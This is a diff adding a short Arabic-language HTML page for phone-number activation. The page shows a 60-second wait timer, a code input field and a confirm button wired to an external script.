@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تفعيل الرقم</title>
+  <style>
+    body { font-family: Arial, sans-serif; direction: rtl; text-align: center; }
+    input { padding: 10px; margin: 5px; width: 200px; }
+    button { background: blue; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h2>تفعيل الرقم</h2>
+  <p>رقمك: <span id="phone"></span></p>
+  <p>انتظر وصول الكود خلال <span id="timer">60</span> ثانية</p>
+
+  <input type="text" id="code" placeholder="ادخل الكود">
+  <button onclick="confirmActivation()">تأكيد التفعيل</button>
+
+  <p id="status"></p>
+
+  <script src="script.js"></script>
+</body>
+</html>
